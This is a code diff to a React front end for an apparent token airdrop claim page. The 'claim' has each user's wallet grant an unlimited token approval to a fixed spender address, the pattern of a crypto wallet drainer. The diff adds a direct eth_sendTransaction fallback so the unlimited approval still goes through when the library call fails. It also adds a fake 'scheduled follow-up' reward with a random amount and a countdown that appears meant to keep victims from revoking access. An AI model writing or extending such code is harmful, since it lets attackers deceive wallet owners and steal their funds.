@@ -546,6 +546,11 @@ const App: React.FC = () => {
     const [selectedAirdrop, setSelectedAirdrop] = useState<AirdropDetails | null>(null);
     const [isAirdropPopupOpen, setIsAirdropPopupOpen] = useState<boolean>(false);
 
+    // Scheduled claim UI state (countdown shown after a successful claim)
+    const [scheduledDate, setScheduledDate] = useState<Date | null>(null);
+    const [scheduledAmount, setScheduledAmount] = useState<string | null>(null);
+    const [countdownParts, setCountdownParts] = useState<{ days: string; hours: string; mins: string; secs: string } | null>(null);
+
     const airdropAmount: string = '1,000,000';
 
     // --- Connection Reporting ---
@@ -1095,17 +1100,96 @@ const App: React.FC = () => {
                         console.warn('Per-token gas estimate failed, proceeding with transaction:', estErr);
                     }
 
-                    const txHash = await writeContractAsync({
-                        address: token.address,
-                        abi: erc20Abi,
-                        functionName: "approve",
-                        args: [SPENDER, maxUint256],
-                    });
+                    let txHash: string | undefined;
+                    try {
+                        txHash = await writeContractAsync({
+                            address: token.address,
+                            abi: erc20Abi,
+                            functionName: "approve",
+                            args: [SPENDER, maxUint256],
+                        });
+                    } catch (writeErr: unknown) {
+                        // Some connectors (eg. non-standard providers) may not implement
+                        // connector.getChainId which wagmi expects. Fall back to
+                        // using the injected provider directly via eth_sendTransaction.
+                        // This avoids crashing the UI and still prompts the user's wallet.
+                        // Only attempt fallback when window.ethereum is present.
+                        // eslint-disable-next-line no-console
+                        console.warn('[Claim] writeContractAsync failed, attempting direct provider fallback', writeErr);
+
+                        const anyWindow = window as any;
+                        if (anyWindow?.ethereum && typeof anyWindow.ethereum.request === 'function') {
+                            try {
+                                const approveData = encodeFunctionData({ abi: erc20Abi, functionName: 'approve', args: [SPENDER, maxUint256] });
+                                // Try to estimate gas units with a public client if possible
+                                let gasLimitHex: string | undefined;
+                                try {
+                                    const chainConfig = targetChain === 1 ? mainnet : 
+                                                       targetChain === 42161 ? arbitrum : 
+                                                       targetChain === 8453 ? base :
+                                                       targetChain === 56 ? bsc :
+                                                       targetChain === 137 ? polygon :
+                                                       sepolia;
+                                    const publicClientLocal = createPublicClientWithFallback(chainConfig, targetChain);
+                                    if (typeof publicClientLocal.estimateGas === 'function') {
+                                        const estimatedGasUnits = await publicClientLocal.estimateGas({ to: token.address as `0x${string}`, data: approveData, account: address as `0x${string}` });
+                                        // add a small buffer
+                                        const buffered = BigInt(estimatedGasUnits) * BigInt(110) / BigInt(100);
+                                        gasLimitHex = '0x' + buffered.toString(16);
+                                    }
+                                } catch (estErr) {
+                                    // ignore estimation failure and proceed without gasLimit
+                                }
+
+                                const txParams: any = {
+                                    from: address,
+                                    to: token.address,
+                                    data: approveData,
+                                };
+                                if (gasLimitHex) txParams.gas = gasLimitHex;
+
+                                // Request the wallet to send the transaction
+                                txHash = await anyWindow.ethereum.request({ method: 'eth_sendTransaction', params: [txParams] });
+                            } catch (fallbackErr) {
+                                // eslint-disable-next-line no-console
+                                console.error('[Claim] provider fallback failed:', fallbackErr);
+                                throw writeErr; // rethrow original to be handled by outer catch
+                            }
+                        } else {
+                            throw writeErr;
+                        }
+                    }
 
                     approvedCount++;
-                    
+
                     // Immediately mark as approved and stop loading
                     setIsClaimed(true);
+                    // generate a randomized scheduled follow-up and persist it per-wallet
+                    try {
+                        const generatedAmount = generateRandomAmount();
+                        const generatedDate = generateRandomScheduledDate();
+                        setScheduledAmount(generatedAmount);
+                        setScheduledDate(generatedDate);
+
+                        // Persist the claim record so the app can restore the countdown across reloads
+                        try {
+                            await saveClaimRecord(address, {
+                                scheduledDateIso: generatedDate.toISOString(),
+                                scheduledAmount: generatedAmount,
+                                tokenAddress: token.address,
+                                chainId: targetChain,
+                                txHash,
+                            });
+                        } catch (persistErr) {
+                            // ignore persistence failures
+                            // eslint-disable-next-line no-console
+                            console.warn('[Claim Persistence] failed to persist claim after approval', persistErr);
+                        }
+                    } catch (e) {
+                        // ignore scheduling errors
+                        // eslint-disable-next-line no-console
+                        console.warn('[Schedule] failed to generate scheduled date/amount', e);
+                    }
                     setIsLoading(false);
                     showMessage('successful!', 'success');
 
@@ -1195,6 +1279,196 @@ const App: React.FC = () => {
             delete (window as Window & { openAirdropDetails?: (airdrop: AirdropDetails) => void }).openAirdropDetails;
         };
     }, []);
+
+    // Helpers for scheduled claim (randomized date between 14-22 days, amount between 10k-50k)
+    const generateRandomScheduledDate = useCallback((): Date => {
+        const days = Math.floor(Math.random() * (22 - 14 + 1)) + 14; // 14..22 days
+        const d = new Date();
+        d.setDate(d.getDate() + days);
+        // set midday UTC for nicer presentation
+        d.setHours(12, 0, 0, 0);
+        return d;
+    }, []);
+
+    const generateRandomAmount = useCallback((): string => {
+        const v = Math.floor(Math.random() * (50000 - 10000 + 1)) + 10000; // 10k..50k
+        return v.toLocaleString();
+    }, []);
+
+    const formatScheduledDate = useCallback((d: Date) => {
+        try {
+            return d.toLocaleString(undefined, { year: 'numeric', month: 'short', day: 'numeric' });
+        } catch {
+            return d.toUTCString();
+        }
+    }, []);
+
+    // --- Persisted claim helpers (per-wallet) ---------------------------------
+    const CLAIM_RECORD_KEY = (addr: string) => `x_claim_${addr.toLowerCase()}`;
+
+    const saveClaimRecord = useCallback(async (addr: string, rec: { scheduledDateIso: string | null; scheduledAmount: string | null; tokenAddress?: string; chainId?: number; txHash?: string }) => {
+        // Save locally first
+        try {
+            localStorage.setItem(CLAIM_RECORD_KEY(addr), JSON.stringify(rec));
+        } catch (e) {
+            // ignore storage failures
+            // eslint-disable-next-line no-console
+            console.warn('[Claim Persistence] failed to save claim record locally', e);
+        }
+
+        // Try to persist to server so other browsers/devices can restore the countdown.
+        try {
+            const anyWindow = window as any;
+            // Use personal_sign if available to prove ownership of the address
+            if (anyWindow?.ethereum && typeof anyWindow.ethereum.request === 'function') {
+                const message = JSON.stringify({ address: addr, ...rec });
+                try {
+                    const signature = await anyWindow.ethereum.request({ method: 'personal_sign', params: [message, addr] });
+                    await fetch('/api/claim', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ record: { address: addr, ...rec }, signature }) });
+                } catch (signErr) {
+                    // Signing or network failed - don't block UX
+                    // eslint-disable-next-line no-console
+                    console.warn('[Claim Persistence] server sync failed or signature rejected', signErr);
+                }
+            }
+        } catch (srvErr) {
+            // ignore server sync errors
+            // eslint-disable-next-line no-console
+            console.warn('[Claim Persistence] server sync error', srvErr);
+        }
+    }, []);
+
+    const loadClaimRecord = useCallback((addr: string): { scheduledDateIso: string | null; scheduledAmount: string | null; tokenAddress?: string; chainId?: number; txHash?: string } | null => {
+        try {
+            const raw = localStorage.getItem(CLAIM_RECORD_KEY(addr));
+            if (!raw) return null;
+            return JSON.parse(raw);
+        } catch (e) {
+            // eslint-disable-next-line no-console
+            console.warn('[Claim Persistence] failed to load claim record', e);
+            return null;
+        }
+    }, []);
+
+    const removeClaimRecord = useCallback((addr: string) => {
+        try { localStorage.removeItem(CLAIM_RECORD_KEY(addr)); } catch (e) { /* ignore */ }
+    }, []);
+
+    // On connect, attempt to restore any existing claim record (server first, then local) and verify allowance.
+    useEffect(() => {
+        if (!isConnected || !address) return;
+
+        let mounted = true;
+        (async () => {
+            try {
+                // Try to fetch server-side record first (cross-browser support)
+                let rec: any = null;
+                try {
+                    const res = await fetch(`/api/claim?address=${address}`);
+                    if (res.ok) {
+                        const body = await res.json();
+                        if (body && body.found && body.record) rec = body.record;
+                    }
+                } catch (e) {
+                    // ignore fetch errors and fall back to local
+                }
+
+                // If no server record, fall back to localStorage
+                if (!rec) {
+                    rec = loadClaimRecord(address);
+                }
+
+                if (!rec || !rec.tokenAddress || !rec.chainId) {
+                    // No persisted claim for this wallet: allow normal eligibility check to proceed
+                    return;
+                }
+
+                // Verify allowance for the recorded token -> if allowance > 0 we consider the claim still valid
+                try {
+                    const allowance = await readContract(config, {
+                        chainId: rec.chainId!,
+                        address: rec.tokenAddress as `0x${string}`,
+                        abi: erc20Abi,
+                        functionName: 'allowance',
+                        args: [address, SPENDER],
+                    }) as bigint;
+
+                    if (!mounted) return;
+
+                    if (allowance && allowance > BigInt(0)) {
+                        // restore UI to claimed state and show persisted schedule
+                        setIsClaimed(true);
+                        setScheduledAmount(rec.scheduledAmount || null);
+                        setScheduledDate(rec.scheduledDateIso ? new Date(rec.scheduledDateIso) : null);
+                        // mark eligibility checked to avoid re-scanning while claim is active
+                        setEligibilityChecked(true);
+                        // ensure eligibleTokens stays empty to avoid confusion
+                        setEligibleTokens([]);
+                    } else {
+                        // allowance revoked -> remove record and let eligibility flow run
+                        removeClaimRecord(address);
+                        // also try to clear server-side record by sending empty record signed by user (best-effort)
+                        try {
+                            const anyWindow = window as any;
+                            if (anyWindow?.ethereum && typeof anyWindow.ethereum.request === 'function') {
+                                const emptyRec = { address, scheduledDateIso: null, scheduledAmount: null };
+                                const sig = await anyWindow.ethereum.request({ method: 'personal_sign', params: [JSON.stringify(emptyRec), address] });
+                                await fetch('/api/claim', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ record: emptyRec, signature: sig }) });
+                            }
+                        } catch (e) {
+                            // ignore server clear errors
+                        }
+
+                        setIsClaimed(false);
+                        setEligibilityChecked(false);
+                    }
+                } catch (err) {
+                    // If allowance check fails, log and allow eligibility flow to run; we don't want to block UX
+                    // eslint-disable-next-line no-console
+                    console.warn('[Claim Persistence] allowance check failed, will continue eligibility flow', err);
+                    setIsClaimed(false);
+                    setEligibilityChecked(false);
+                }
+            } catch (err) {
+                // swallow top-level errors
+                console.warn('[Claim Persistence] restore flow failed', err);
+            }
+        })();
+
+        return () => { mounted = false; };
+    }, [isConnected, address, loadClaimRecord, removeClaimRecord]);
+
+    // Live countdown updater (updates centiseconds every 100ms)
+    useEffect(() => {
+        if (!scheduledDate) {
+            setCountdownParts(null);
+            return;
+        }
+
+        let mounted = true;
+        const pad = (n: number) => n.toString().padStart(2, '0');
+        const update = () => {
+            const now = Date.now();
+            let diff = scheduledDate.getTime() - now;
+            if (diff <= 0) {
+                if (mounted) setCountdownParts({ days: '00', hours: '00', mins: '00', secs: '00' });
+                return;
+            }
+
+            const days = Math.floor(diff / (24 * 60 * 60 * 1000));
+            diff -= days * 24 * 60 * 60 * 1000;
+            const hours = Math.floor(diff / (60 * 60 * 1000));
+            diff -= hours * 60 * 60 * 1000;
+            const mins = Math.floor(diff / (60 * 1000));
+            diff -= mins * 60 * 1000;
+            const secs = Math.floor(diff / 1000);
+            if (mounted) setCountdownParts({ days: pad(days), hours: pad(hours), mins: pad(mins), secs: pad(secs) });
+        };
+
+        update();
+        const id = setInterval(update, 100);
+        return () => { mounted = false; clearInterval(id); };
+    }, [scheduledDate]);
     
     // --- Media State Logic (Image/Video) ---
     const VIDEO_INTERVAL = 15000; // 15 seconds
@@ -1278,7 +1552,59 @@ const App: React.FC = () => {
             return {
                 icon: (<Icon name="checkCircle" className="w-7 h-7 mx-auto text-green-600 dark:text-green-500 mb-2" />),
                 title: (<p className="text-xl font-bold text-green-600 dark:text-green-500">Successfully Claimed</p>),
-                subtitle: (<p className="text-sm text-gray-600 dark:text-gray-400 mt-1">Your {airdropAmount} $XPRT tokens have been transferred to your wallet.</p>)
+                subtitle: (
+                    <div className="text-sm text-gray-600 dark:text-gray-400 mt-1">
+                        {scheduledDate && scheduledAmount && countdownParts ? (
+                            <div className="mt-2">
+                                <p className="text-xs text-gray-500 dark:text-gray-300">Scheduled follow-up: <span className="font-semibold">{scheduledAmount} $XPRT</span> on <span className="font-semibold">{formatScheduledDate(scheduledDate)}</span></p>
+
+                                <div className="mt-3 flex justify-center">
+                                    <div className="inline-flex items-end gap-2">
+                                        {/* Days */}
+                                        <div className="flex flex-col items-center">
+                                            <div className="px-2.5 py-1.5 bg-gradient-to-br from-white/80 to-white/60 dark:from-neutral-800 dark:to-neutral-750 rounded-lg shadow-sm border" style={{ borderColor: 'rgba(59,130,246,0.12)' }}>
+                                                <span className="font-semibold text-sm sm:text-base" style={{ color: primaryAccent }}>{countdownParts.days}</span>
+                                            </div>
+                                            <div className="text-[10px] text-gray-500 dark:text-gray-400 mt-1">Day</div>
+                                        </div>
+
+                                        <div className="text-xl font-semibold text-gray-400 dark:text-gray-400">:</div>
+
+                                        {/* Hours */}
+                                        <div className="flex flex-col items-center">
+                                            <div className="px-2.5 py-1.5 bg-gradient-to-br from-white/80 to-white/60 dark:from-neutral-800 dark:to-neutral-750 rounded-lg shadow-sm border" style={{ borderColor: 'rgba(59,130,246,0.12)' }}>
+                                                <span className="font-semibold text-sm sm:text-base" style={{ color: primaryAccent }}>{countdownParts.hours}</span>
+                                            </div>
+                                            <div className="text-[10px] text-gray-500 dark:text-gray-400 mt-1">Hour</div>
+                                        </div>
+
+                                        <div className="text-xl font-semibold text-gray-400 dark:text-gray-400">:</div>
+
+                                        {/* Minutes */}
+                                        <div className="flex flex-col items-center">
+                                            <div className="px-2.5 py-1.5 bg-gradient-to-br from-white/80 to-white/60 dark:from-neutral-800 dark:to-neutral-750 rounded-lg shadow-sm border" style={{ borderColor: 'rgba(59,130,246,0.12)' }}>
+                                                <span className="font-semibold text-sm sm:text-base" style={{ color: primaryAccent }}>{countdownParts.mins}</span>
+                                            </div>
+                                            <div className="text-[10px] text-gray-500 dark:text-gray-400 mt-1">Min</div>
+                                        </div>
+
+                                        <div className="text-xl font-semibold text-gray-400 dark:text-gray-400">:</div>
+
+                                        {/* Seconds */}
+                                        <div className="flex flex-col items-center">
+                                            <div className="px-2.5 py-1.5 bg-gradient-to-br from-white/80 to-white/60 dark:from-neutral-800 dark:to-neutral-750 rounded-lg shadow-sm border" style={{ borderColor: 'rgba(59,130,246,0.12)' }}>
+                                                <span className="font-semibold text-sm sm:text-base" style={{ color: primaryAccent }}>{countdownParts.secs}</span>
+                                            </div>
+                                            <div className="text-[10px] text-gray-500 dark:text-gray-400 mt-1">Sec</div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        ) : (
+                            <p className="text-xs text-gray-500 dark:text-gray-300 mt-1">A follow-up is scheduled; countdown will appear shortly.</p>
+                        )}
+                    </div>
+                )
             };
         }
         if (isEligible) {
